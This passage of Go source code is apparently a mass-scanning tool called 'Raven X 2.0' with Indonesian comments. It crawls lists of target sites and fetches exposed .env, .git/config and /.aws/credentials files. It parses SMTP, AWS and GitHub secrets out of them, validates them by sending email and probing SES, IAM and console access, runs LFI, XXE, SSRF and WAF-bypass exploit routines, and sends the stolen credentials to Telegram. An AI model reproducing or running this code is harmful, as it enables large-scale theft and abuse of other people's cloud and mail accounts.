
	// Pattern untuk .env style
	lines := strings.Split(code, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)

		// MAIL_HOST atau SMTP_HOST
		if match := regexp.MustCompile(`(?i)(?:MAIL_HOST|SMTP_HOST)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			config["host"] = strings.Trim(match[1], `"'`)
		}
		// MAIL_PORT atau SMTP_PORT
		if match := regexp.MustCompile(`(?i)(?:MAIL_PORT|SMTP_PORT)\s*=\s*["']?(\d+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			config["port"] = match[1]
		}
		// MAIL_USERNAME atau SMTP_USER
		if match := regexp.MustCompile(`(?i)(?:MAIL_USERNAME|SMTP_USER|SMTP_USERNAME)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			config["user"] = strings.Trim(match[1], `"'`)
		}
		// MAIL_PASSWORD atau SMTP_PASS
		if match := regexp.MustCompile(`(?i)(?:MAIL_PASSWORD|SMTP_PASS|SMTP_PASSWORD)\s*=\s*["']?([^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			config["pass"] = strings.Trim(match[1], `"'`)
		}
		// MAIL_FROM
		if match := regexp.MustCompile(`(?i)(?:MAIL_FROM|MAIL_FROM_ADDRESS|SMTP_FROM)\s*=\s*["']?([^"'\s]+@[^"'\s]+)["']?`).FindStringSubmatch(line); len(match) > 1 {
			config["from"] = strings.Trim(match[1], `"'`)
		}
	}

	if len(config) >= 5 {
		configs = append(configs, config)
	}

	return configs
}

// extractSMTPFromPHP extract dari PHP config array
func (a *AWSScanner) extractSMTPFromPHP(code string) []map[string]string {
	configs := []map[string]string{}

	// Pattern untuk PHP array
	phpPattern := regexp.MustCompile(`(?s)(?:array|\$config)\s*\([^)]*(?:smtp|mail)[^)]*\)`)
	matches := phpPattern.FindAllString(code, -1)

	for _, match := range matches {
		config := make(map[string]string)

		// Extract dari PHP array syntax
		hostRe := regexp.MustCompile(`["'](?:host|smtp_host)["']\s*=>\s*["']([^"']+)["']`)
		portRe := regexp.MustCompile(`["'](?:port|smtp_port)["']\s*=>\s*["']?(\d+)["']?`)
		userRe := regexp.MustCompile(`["'](?:user|username|smtp_user)["']\s*=>\s*["']([^"']+)["']`)
		passRe := regexp.MustCompile(`["'](?:pass|password|smtp_pass)["']\s*=>\s*["']([^"']+)["']`)
		fromRe := regexp.MustCompile(`["'](?:from|from_email)["']\s*=>\s*["']([^"']+)["']`)

		if m := hostRe.FindStringSubmatch(match); len(m) > 1 {
			config["host"] = m[1]
		}
		if m := portRe.FindStringSubmatch(match); len(m) > 1 {
			config["port"] = m[1]
		}
		if m := userRe.FindStringSubmatch(match); len(m) > 1 {
			config["user"] = m[1]
		}
		if m := passRe.FindStringSubmatch(match); len(m) > 1 {
			config["pass"] = m[1]
		}
		if m := fromRe.FindStringSubmatch(match); len(m) > 1 {
			config["from"] = m[1]
		}

		if len(config) >= 5 {
			configs = append(configs, config)
		}
	}

	return configs
}

// extractSMTPFromXML extract dari XML/Properties format
func (a *AWSScanner) extractSMTPFromXML(code string) []map[string]string {
	configs := []map[string]string{}
	config := make(map[string]string)

	// Pattern untuk XML tags
	hostRe := regexp.MustCompile(`<(?:smtp-)?host>([^<]+)</(?:smtp-)?host>`)
	portRe := regexp.MustCompile(`<(?:smtp-)?port>(\d+)</(?:smtp-)?port>`)
	userRe := regexp.MustCompile(`<(?:smtp-)?(?:user|username)>([^<]+)</(?:smtp-)?(?:user|username)>`)
	passRe := regexp.MustCompile(`<(?:smtp-)?(?:pass|password)>([^<]+)</(?:smtp-)?(?:pass|password)>`)
	fromRe := regexp.MustCompile(`<(?:smtp-)?(?:from|sender)>([^<]+)</(?:smtp-)?(?:from|sender)>`)

	if m := hostRe.FindStringSubmatch(code); len(m) > 1 {
		config["host"] = m[1]
	}
	if m := portRe.FindStringSubmatch(code); len(m) > 1 {
		config["port"] = m[1]
	}
	if m := userRe.FindStringSubmatch(code); len(m) > 1 {
		config["user"] = m[1]
	}
	if m := passRe.FindStringSubmatch(code); len(m) > 1 {
		config["pass"] = m[1]
	}
	if m := fromRe.FindStringSubmatch(code); len(m) > 1 {
		config["from"] = m[1]
	}

	if len(config) >= 5 {
		configs = append(configs, config)
	}

	return configs
}

// extractSMTPByProximity extract berdasarkan kedekatan field
// HANYA untuk non-JS files (.env, config files, dll)
func (a *AWSScanner) extractSMTPByProximity(code string) []map[string]string {
	configs := []map[string]string{}

	// Split by lines dan cari field yang berdekatan (dalam 15 baris)
	lines := strings.Split(code, "\n")

	for i := 0; i < len(lines); i++ {
		// Cari window 15 baris (dikurangi dari 20 untuk lebih strict)
		endIdx := i + 15
		if endIdx > len(lines) {
			endIdx = len(lines)
		}

		window := strings.Join(lines[i:endIdx], "\n")

		// Cek apakah ada indikasi SMTP config yang kuat
		windowLower := strings.ToLower(window)
		if !strings.Contains(windowLower, "smtp") &&
			!strings.Contains(windowLower, "mail_host") &&
			!strings.Contains(windowLower, "mail_port") {
			continue
		}

		// Skip jika window mengandung JS code indicators
		if strings.ContainsAny(window, "()=>{}[];|&") {
			jsIndicators := []string{"function", "const ", "let ", "var ", "import ", "export ", "=>", "return ", ".map(", ".filter("}
			hasJSCode := false
			for _, indicator := range jsIndicators {
				if strings.Contains(windowLower, indicator) {
					hasJSCode = true
					break
				}
			}
			if hasJSCode {
				continue
			}
		}

		config := make(map[string]string)

		// Extract dengan pattern yang lebih strict
		// Host: harus ada keyword SMTP/MAIL_HOST dan valid domain
		if m := regexp.MustCompile(`(?i)(?:smtp_host|mail_host|smtp_server|mail_server)\s*[:=]\s*["']?([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+)["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["host"] = m[1]
		}
		// Port: harus ada keyword PORT
		if m := regexp.MustCompile(`(?i)(?:smtp_port|mail_port|port)\s*[:=]\s*["']?(\d+)["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["port"] = m[1]
		}
		// User: harus ada keyword USER/USERNAME
		if m := regexp.MustCompile(`(?i)(?:smtp_user|mail_user|smtp_username|mail_username|username)\s*[:=]\s*["']?([^"'\s]{3,})["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["user"] = m[1]
		}
		// Password: harus ada keyword PASSWORD/PASS
		if m := regexp.MustCompile(`(?i)(?:smtp_password|mail_password|smtp_pass|mail_pass|password)\s*[:=]\s*["']?([^"'\s]{4,})["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["pass"] = m[1]
		}
		// From: harus ada keyword FROM dan valid email
		if m := regexp.MustCompile(`(?i)(?:smtp_from|mail_from|from_email|from_address)\s*[:=]\s*["']?([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})["']?`).FindStringSubmatch(window); len(m) > 1 {
			config["from"] = m[1]
		}

		if len(config) >= 5 {
			configs = append(configs, config)
		}
	}

	return configs
}

// testSMTPConnection test koneksi SMTP yang ditemukan
func (a *AWSScanner) testSMTPConnection(host, port, user, pass, from, sourceURL string) {
	addr := fmt.Sprintf("%s:%s", host, port)
	auth := smtp.PlainAuth("", user, pass, host)
	msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: Raven X Test\r\n\r\nTest Email.", from, a.Config.SMTPTestEmail)

	timeout := 15 * time.Second
	done := make(chan error, 1)

	go func() {
		done <- smtp.SendMail(addr, auth, from, []string{a.Config.SMTPTestEmail}, []byte(msg))
	}()

	select {
	case err := <-done:
		if err == nil {
			smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
			a.logValid("SMTP (AST)", smtpLine)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_valid.txt")

			globalCounters.mu.Lock()
			globalCounters.ValidSMTP++
			globalCounters.mu.Unlock()

			tlgMsg := a.tgHit("📬", "RANDOM SMTP HIT", sourceURL) + fmt.Sprintf(
				"\n🆔 CREDENTIALS\nHost : %s\nPort : %s\nUser : %s\nPass : %s\nFrom : %s\nSecure : No\n\n📋 SMTP URL\nsmtp://%s:%s@%s:%s\n",
				host, port, user, pass, from, user, pass, host, port)
			go a.sendTelegram(tlgMsg)
			a.storeValidKeyLimit("SMTP", host, "Email Sent (AST)")
		}
	case <-time.After(timeout):
		pterm.Debug.Printfln("[SMTP TIMEOUT] %s: Operation timed out after %v", host, timeout)
	}
}

func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.GetCallerIdentityOutput, cfg aws.Config, s3Status string) {

	keyLine := fmt.Sprintf("%s:%s", ak, sk)
	if st != "" {
		keyLine = fmt.Sprintf("%s:%s:%s", ak, sk, st)
	}

	a.logValid("AWS", fmt.Sprintf("%s (S3: %s)", keyLine, s3Status))
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sourceURL, keyLine, a.DefaultRegion), "aws_credentials.txt")
	a.saveIntoFile(fmt.Sprintf("%s:%s", ak, sk), "aws_valid.txt")

	globalCounters.mu.Lock()
	globalCounters.AWSKeysValidated++
	globalCounters.mu.Unlock()

	// Pengecekan Quota AWS menggunakan AWSChecks
	sesInfo := a.checkSESDetailsAllRegions(cfg)
	snsInfo := a.checkSNSLimitAllRegions(cfg)
	fargateInfo := a.checkFargateOnDemandLimitAllRegions(cfg)
	fedInfo := a.getFederationConsoleURL(cfg, identity, 43200)

	// Coba kirim email via AWS SES
	emailResult := a.SendEmailViaAWS(cfg, ak, sk, sourceURL)

	arnParts := strings.Split(*identity.Arn, ":")
	userOrRole := arnParts[len(arnParts)-1]
	iamAuditResult := "Skipped (Not User)"
	if strings.Contains(*identity.Arn, ":user/") {
		iamAuditResult = a.auditIAMUser(cfg, userOrRole)
	}

	// Enhanced report format matching main.py style
	reportLines := []string{}
	reportLines = append(reportLines, "🔒  AWS SES Status 🔒")
	reportLines = append(reportLines, "")
	reportLines = append(reportLines, fmt.Sprintf("🔑 Access Key: %s", ak))
	reportLines = append(reportLines, fmt.Sprintf("🔒 Secret Key: %s", sk))
	if st != "" {
		reportLines = append(reportLines, fmt.Sprintf("🎫 Session Token: %s...", st[:20]))
	}
	reportLines = append(reportLines, "")
	reportLines = append(reportLines, fmt.Sprintf("🌐 Region: %s", a.DefaultRegion))
	reportLines = append(reportLines, "")

	var sesDetails string
	maxQuota := 0.0
	sentLast24 := 0.0
	allIdentities := []string{}

	if len(sesInfo) > 0 {
		reportLines = append(reportLines, "✅  Account Information (SESv2)")
		for r, d := range sesInfo {
			quota, ok := d["SendQuota"].(float64)
			if ok && quota > maxQuota {
				maxQuota = quota
			}
			lastSent, _ := d["LastSend"].(float64)
			if lastSent > sentLast24 {
				sentLast24 = lastSent
			}
			health, _ := d["HealthStatus"].(string)
			identities, _ := d["Identities"].([]string)
			if identities != nil {
				allIdentities = append(allIdentities, identities...)
			}
			sesDetails += fmt.Sprintf("  • %s: %.0f/24h (Health: %v)\n", r, quota, health)
		}
		reportLines = append(reportLines, fmt.Sprintf("    📤 Sending Enabled: ✅ YES"))
		reportLines = append(reportLines, fmt.Sprintf("    🏭 Production Access: ✅ YES"))
		reportLines = append(reportLines, fmt.Sprintf("    📊 Max 24h Send: %.0f emails", maxQuota))
		reportLines = append(reportLines, fmt.Sprintf("    ✉️ Sent Last 24h: %.0f emails", sentLast24))
		reportLines = append(reportLines, fmt.Sprintf("    📬 Remaining: %.0f emails", maxQuota-sentLast24))
		reportLines = append(reportLines, "")
	} else {
		sesDetails = "  • No Active SES Found"
		reportLines = append(reportLines, "⚠️ SES Access Denied or Service Not Active in this Region")
		reportLines = append(reportLines, "")
	}

	// Email sending status
	reportLines = append(reportLines, "📧  Email Sending Test")
	if emailResult["success"].(bool) {
		reportLines = append(reportLines, "    ✅ Status: Email Sent Successfully")
		reportLines = append(reportLines, fmt.Sprintf("    📮 From: %s", emailResult["from_email"]))
		reportLines = append(reportLines, fmt.Sprintf("    🌐 Region: %s", emailResult["region"]))
		if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
			reportLines = append(reportLines, fmt.Sprintf("    📊 Quota Limit: %.0f emails/24h", quotaLimit))
		}
		if quotaRemaining, ok := emailResult["quota_remaining"].(float64); ok {
			reportLines = append(reportLines, fmt.Sprintf("    📬 Remaining: %.0f emails", quotaRemaining))
		}
		if identities, ok := emailResult["identities"].([]string); ok && len(identities) > 0 {
			reportLines = append(reportLines, fmt.Sprintf("    📧 Identities: %s", strings.Join(identities, ", ")))
		}
	} else {
		reportLines = append(reportLines, "    ❌ Status: Failed to Send Email")
		if errMsg, ok := emailResult["error"].(string); ok {
			reportLines = append(reportLines, fmt.Sprintf("    ⚠️ Error: %s", errMsg))
		}
	}
	reportLines = append(reportLines, "")

	a.storeValidKeyLimit("AWS", ak, fmt.Sprintf("%.0f SES Limit / S3 Status: %s", maxQuota, s3Status))

	consoleLink := "N/A"
	if fedInfo != nil {
		consoleLink = fmt.Sprintf("<a href='%s'>LOGIN CONSOLE</a>", fedInfo["federation_console_url"])
	}

	emailStatus := "❌ Failed"
	if emailResult["success"].(bool) {
		emailStatus = fmt.Sprintf("✅ Success (From: %s, Region: %s)", emailResult["from_email"], emailResult["region"])
	}

	a.saveIntoFile(fmt.Sprintf("AWS %s SES: %+v SNS: %+v Fargate: %+v IAM Audit: %s", keyLine, sesInfo, snsInfo, fargateInfo, iamAuditResult), "aws_deep_scan.txt")

	hasLimits := len(sesInfo) > 0 || len(snsInfo) > 0 || len(fargateInfo) > 0
	emailSuccess := emailResult["success"].(bool)

	if hasLimits && emailSuccess {
		// Full notification: SES-capable account that can send email
		msg := a.tgHit("🤴", "AWS AKIA HIT", sourceURL) + fmt.Sprintf(
			"\n🆔 CREDENTIALS\nAccess Key : %s\nSecret Key : %s\nAccount : %s\nUser/Role : %s\nS3 : %s\nConsole : %s\nIAM Audit : %s\nEmail Test : %s\nSES Quota : %.0f/24h\n",
			ak, sk, *identity.Account, userOrRole, s3Status, consoleLink, iamAuditResult, emailStatus, maxQuota)
		go a.sendTelegram(msg)
		pterm.Success.Printfln("[AWS NOTIF] Full Telegram for %s (SES + Email)", ak[:8]+"...")
	} else {
		// Simplified: valid key but no SES email capability
		simpleMsg := a.tgHit("🤴", "AWS AKIA HIT", sourceURL) + fmt.Sprintf(
			"\n🆔 CREDENTIALS\nAccess Key : %s\nSecret Key : %s\nAccount : %s\nUser/Role : %s\nS3 : %s\nSES : ❌ No email capability\n",
			ak, sk, *identity.Account, userOrRole, s3Status)
		go a.sendTelegram(simpleMsg)
		pterm.Warning.Printfln("[AWS NOTIF] Simplified Telegram for %s | Limits: %v | Email: %v", ak[:8]+"...", hasLimits, emailSuccess)
	}
}

func (a *AWSScanner) createRequest(domain string) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(requestTimeoutSeconds)*time.Second)
	defer cancel()

	proto := "http"
	if strings.Contains(domain, "://") {
		parts := strings.SplitN(domain, "://", 2)
		proto, domain = parts[0], parts[1]
	}
	domain = strings.TrimRight(domain, "/")

	protocols := []string{proto}
	if proto == "http" {
		protocols = append(protocols, "https")
	}

	for _, p := range protocols {
		mainURL := fmt.Sprintf("%s://%s", p, domain)

		// Check jika URL ini sudah pernah di-scan
		if _, loaded := a.VisitedURLs.LoadOrStore(mainURL, true); loaded {
			pterm.Debug.Printfln("[SKIP] URL already scanned: %s", mainURL)
			continue
		}

		req, errReq := http.NewRequestWithContext(ctx, "GET", mainURL, nil)
		if errReq != nil {
			pterm.Debug.Printfln("[REQUEST CREATE ERROR] Failed to create request for %s: %v", mainURL, errReq)
			continue
		}

		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

		resp, err := client.Do(req)

		if err != nil {
			if ctx.Err() == context.DeadlineExceeded {
				pterm.Debug.Printfln("[TIMEOUT] Request to %s timed out after %ds.", mainURL, requestTimeoutSeconds)
			} else {
				pterm.Debug.Printfln("[HTTP ERROR] %s: %v", mainURL, err)
			}
			continue
		}

		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()

		var wg sync.WaitGroup

		wg.Add(1)
		go func() {
			defer wg.Done()
			a.checkAndSaveKeys(string(body), mainURL)
			jsRegex := regexp.MustCompile(`src=["'](.*?.js)["']`)
			jsFiles := jsRegex.FindAllStringSubmatch(string(body), -1)
			for _, js := range jsFiles {
				if len(js) > 1 {
					fullJS := resolveURL(mainURL, js[1])
					if !a.BlacklistPattern.MatchString(fullJS) {
						if r, e := client.Get(fullJS); e == nil {
							b, _ := ioutil.ReadAll(r.Body)
							r.Body.Close()
							a.checkAndSaveKeys(string(b), fullJS)
						}
					}
				}
			}
		}()

		// Run exploit functions untuk setiap URL
		// Sequential execution untuk menghindari ledakan goroutine
		if a.Config.ExploitMethods.React2Shell {
			a.ExploitReact2Shell(mainURL, mainURL)
		}
		if a.Config.ExploitMethods.BypassWAF {
			a.ExploitBypassWAF(mainURL, mainURL)
		}
		if a.Config.ExploitMethods.BypassMiddleware {
			a.ExploitBypassMiddleware(mainURL, mainURL)
		}
		if a.Config.ExploitMethods.LFI {
			a.ExploitLFI(mainURL, mainURL)
		}
		if a.Config.ExploitMethods.XXE {
			a.ExploitXXE(mainURL, mainURL)
		}
		if a.Config.ExploitMethods.SSRF {
			a.ExploitSSRF(mainURL, mainURL)
		}

		commonPaths := append(a.EnvPaths, a.PHPInfoPaths...)

		commonPaths = append(commonPaths, "/.aws/credentials")

		// Batasi goroutine untuk path scanning
		sem := make(chan struct{}, 100)
		for _, path := range commonPaths {
			wg.Add(1)
			go func(pth string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				fullURL := fmt.Sprintf("%s://%s%s", p, domain, pth)
				if r, e := client.Get(fullURL); e == nil {
					b, _ := ioutil.ReadAll(r.Body)
					r.Body.Close()
					if len(b) > 0 {
						a.checkAndSaveKeys(string(b), fullURL)
					}
				}
			}(path)
		}

		if a.Config.ScanningFeatures.GitHubTokenDeepScan { // Menggunakan flag baru
			wg.Add(1)
			go func() {
				defer wg.Done()
				headURL := fmt.Sprintf("%s://%s/.git/HEAD", p, domain)
				if r, e := client.Get(headURL); e == nil {
					b, _ := ioutil.ReadAll(r.Body)
					r.Body.Close()
					if strings.Contains(string(b), "refs/heads") || strings.Contains(string(b), "ref: refs/") {
						pterm.Warning.Printfln("[GIT EXPOSED] .git found on %s", domain)
						configURL := fmt.Sprintf("%s://%s/.git/config", p, domain)
						if rConf, eConf := client.Get(configURL); eConf == nil {
							bConf, _ := ioutil.ReadAll(rConf.Body)
							rConf.Body.Close()
							a.checkAndSaveKeys(string(bConf), configURL)
						}
					}
				}

				gitURL := fmt.Sprintf("%s://%s/.git/config", p, domain)
				if r, e := client.Get(gitURL); e == nil {
					b, _ := ioutil.ReadAll(r.Body)
					r.Body.Close()
					a.checkAndSaveKeys(string(b), gitURL)
				}
			}()
		}

		wg.Wait()
		return
	}
}

func (a *AWSScanner) ProcessTokenList(filePath string) {
	if !a.Config.ScanningFeatures.GitHubTokenDeepScan { // Pengecekan fitur baru
		pterm.Error.Println("GitHub Token Deep Scan is disabled in config.json. Skipping token list processing.")
		return
	}

	pterm.DefaultSection.Println("GitHub Token List Processor")

	file, err := os.Open(filePath)
	if err != nil {
		pterm.Error.Printfln("Could not open token list file '%s': %v", filePath, err)
		os.Exit(1)
	}
	defer file.Close()

	var tokens []string
	sc := bufio.NewScanner(file)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line != "" {
			tokens = append(tokens, line)
		}
	}

	if len(tokens) == 0 {
		pterm.Warning.Println("No tokens found in the file.")
		return
	}

	pterm.Info.Printfln("Loaded %d tokens for validation.", len(tokens))

	globalCounters.URLsLoaded = len(tokens)

	a.ProgressBar, _ = pterm.DefaultProgressbar.
		WithTotal(len(tokens)).
		WithTitle("Validating GitHub Tokens").
		WithShowCount().
		WithShowElapsedTime().
		Start()

	var wg sync.WaitGroup
	// Batasi concurrent token validation
	sem := make(chan struct{}, 100)

	for _, token := range tokens {
		wg.Add(1)
		sem <- struct{}{}
		go func(t string) {
			defer wg.Done()
			defer func() { <-sem }()
			// CheckGitHubToken akan secara internal memeriksa flag deep scan
			a.CheckGitHubToken(t, "Source: Token List File")
			a.ProgressBar.Increment()
		}(token)
	}
	wg.Wait()
	a.ProgressBar.Stop()
	pterm.Success.Println("Token validation complete.")
}

func (a *AWSScanner) DisplaySummary() {
	pterm.DefaultSection.Println("HASIL SCANNING - RAVEN X 2.0")

	apiSuccessRate := 0.0
	if globalCounters.APIsFoundTotal > 0 {
		apiSuccessRate = float64(globalCounters.APIsValidated) / float64(globalCounters.APIsFoundTotal) * 100
	}

	tokenSuccessRate := 0.0
	if globalCounters.TokensHarvested > 0 {
		tokenSuccessRate = float64(globalCounters.TokensValidated) / float64(globalCounters.TokensHarvested) * 100
	}

	data := [][]string{
		{"Metric", "Count", "Status"},
		{"URLs Loaded", pterm.Cyan(globalCounters.URLsLoaded), ""},
		{"Tokens Harvested", pterm.Yellow(globalCounters.TokensHarvested), ""},
		{"Tokens Validated (GitHub)", pterm.Green(globalCounters.TokensValidated), pterm.Bold.Sprintf("(%.2f%% Success)", tokenSuccessRate)},
		{"🔥 Deep Secrets Found (Mnemonic/GitScan)", pterm.FgLightRed.Sprint(globalCounters.CryptoKeysFound), "Surgical Precision"},
		{"☁️ Valid AWS Keys", pterm.FgLightCyan.Sprint(globalCounters.AWSKeysValidated), "Deep Audit Success"},
		{"Total API Keys Found", pterm.Magenta(globalCounters.APIsFoundTotal), ""},
		{"API Keys Validated (Mail/SMS/Payment/AI/GCP)", pterm.Green(globalCounters.APIsValidated), pterm.Bold.Sprintf("(%.2f%% Success)", apiSuccessRate)},
		{"Valid SMTP Servers", pterm.FgLightGreen.Sprint(globalCounters.ValidSMTP), ""},
	}
	pterm.DefaultTable.WithHasHeader().WithData(data).Render()

	pterm.Println()

	pterm.FgGreen.Println("# ✅ Valid Keys & Control Limits")

	limitData := [][]string{{"Type", "Key (Masked)", "Limit/Quota"}}

	a.ValidKeyLimits.Range(func(key, value interface{}) bool {
		keyStr := key.(string)
		limitStr := value.(string)
		parts := strings.Split(keyStr, ":")
		if len(parts) >= 2 {
			keyType := parts[0]
			keyVal := parts[1]
			limitData = append(limitData, []string{pterm.NewStyle(pterm.Bold).Sprint(keyType), pterm.Cyan(keyVal), pterm.Green(limitStr)})
		}
		return true
	})

	if len(limitData) > 1 {
		pterm.DefaultTable.WithHasHeader().WithData(limitData).Render()
	} else {
		pterm.Info.Println("No API keys with observable limits were validated and stored.")
	}

	pterm.FgGreen.Println("\n======== ALL PROCESSES COMPLETED! ========")
}

func renderBanner() {
	pterm.DefaultBigText.WithLetters(
		pterm.NewLettersFromStringWithStyle("RAVEN", pterm.NewStyle(pterm.FgCyan)),
		pterm.NewLettersFromStringWithStyle("X 2.0", pterm.NewStyle(pterm.FgLightMagenta)),
	).Render()
	pterm.DefaultCenter.Println(pterm.LightWhite("Advanced AWS & Secret Scanner CLI"))
	pterm.DefaultCenter.Println(pterm.Gray("Based on original work by @JIMMYBOGARTZ | UI by Raven X Team"))
	pterm.Println()
}

func interactiveMode() string {
	renderBanner()
	targetFile, _ := pterm.DefaultInteractiveTextInput.Show("Enter list file path (URLs)")
	if targetFile == "" {
		pterm.Error.Println("File path cannot be empty.")
		os.Exit(1)
	}
	return targetFile
}

func (a *AWSScanner) processBatch(urls []string) {
	var wg sync.WaitGroup
	// Batasi concurrent HTTP requests untuk menghindari OOM
	sem := make(chan struct{}, 200)

	for _, u := range urls {
		wg.Add(1)
		sem <- struct{}{}
		go func(url string) {
			defer wg.Done()
			defer func() { <-sem }()
			a.createRequest(url)
			if a.ProgressBar != nil {
				a.ProgressBar.Increment()
			}
		}(u)
	}
	wg.Wait()
}

func (a *AWSScanner) runBatched(listFile string) {
	renderBanner()

	pterm.Info.Println("Calculating total lines for progress bar...")
	totalLines, err := countLines(listFile)
	if err != nil {
		pterm.Error.Printfln("Failed to count lines: %v", err)
		os.Exit(1)
	}

	pterm.Info.Printfln("Total targets: %d. Batch size: %d. Timeout: %ds.", totalLines, batchSize, requestTimeoutSeconds)
	globalCounters.URLsLoaded = totalLines

	a.ProgressBar, _ = pterm.DefaultProgressbar.
		WithTotal(totalLines).
		WithTitle("Scanning Targets (Batched)").
		WithShowCount().
		WithShowElapsedTime().
		Start()

	file, err := os.Open(listFile)
	if err != nil {
		pterm.Error.Printfln("Could not open file '%s': %v", listFile, err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var batch []string

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		batch = append(batch, line)

		if len(batch) >= batchSize {
			a.processBatch(batch)

			batch = nil

			runtime.GC()
		}
	}

	if len(batch) > 0 {
		a.processBatch(batch)
		batch = nil
		runtime.GC()
	}

	if err := scanner.Err(); err != nil {
		pterm.Error.Printfln("Error reading file: %v", err)
	}

	a.ProgressBar.Stop()
	a.DisplaySummary()
}

func main() {
	flag.IntVar(&requestTimeoutSeconds, "timeout", 20, "Global timeout for each HTTP request in seconds.")
	flag.IntVar(&batchSize, "batch", 500000, "Number of URLs to process per batch before forcing GC.")

	var tokenListFile string
	flag.StringVar(&tokenListFile, "tokenlist", "", "Path to a file containing a list of GitHub tokens (one per line).")

	var ipOnlyMode bool
	flag.BoolVar(&ipOnlyMode, "ip-only", false, "Extract only IP addresses from input and scan them.")

	flag.Parse()

	var listFile string
	listArgs := flag.Args()

	scanner := NewAWSScanner(defaultConfigPath)

	if tokenListFile != "" {
		scanner.ProcessTokenList(tokenListFile)
		scanner.DisplaySummary()
		return
	}

	if len(listArgs) < 1 {
		listFile = interactiveMode()
	} else {
		listFile = listArgs[0]
	}

	if _, err := os.Stat(listFile); os.IsNotExist(err) {
		pterm.Error.Printfln("File '%s' not found.", listFile)
		os.Exit(1)
	}

	// IP-only mode: extract IPs and scan them
	if ipOnlyMode {
		f, err := os.Open(listFile)
		if err != nil {
			pterm.Error.Printfln("Error opening file: %v", err)
			os.Exit(1)
		}
		defer f.Close()

		fileScanner := bufio.NewScanner(f)
		allIPs := []string{}
		for fileScanner.Scan() {
			line := fileScanner.Text()
			ips := scanner.ExtractIPOnly(line)
			allIPs = append(allIPs, ips...)
		}

		// Write unique IPs to temp file
		uniqueIPs := make(map[string]bool)
		tempFile, _ := ioutil.TempFile("", "raven-ips-*.txt")
		defer os.Remove(tempFile.Name())

		for _, ip := range allIPs {
			if !uniqueIPs[ip] {
				uniqueIPs[ip] = true
				tempFile.WriteString("http://" + ip + "\n")
				tempFile.WriteString("https://" + ip + "\n")
			}
		}
		tempFile.Close()

		listFile = tempFile.Name()
		pterm.Info.Printfln("IP-only mode: Extracted %d unique IPs, scanning as URLs...", len(uniqueIPs))
	}

	mainClient := &http.Client{
		Timeout: time.Duration(requestTimeoutSeconds) * time.Second,
	}

	enhancer := NewEnhancer(mainClient)
	enhancer.EnhanceScanner(scanner)

	f, err := os.Open(listFile)
	if err == nil {
		sc := bufio.NewScanner(f)
		if sc.Scan() {
			firstURL := strings.TrimSpace(sc.Text())
			go enhancer.CrawlAndExtract(firstURL, 2, scanner)
			pterm.Info.Println("Enhancer pre-scan activated for:", firstURL)
		}
		f.Close()
	}

	scanner.runBatched(listFile)
}
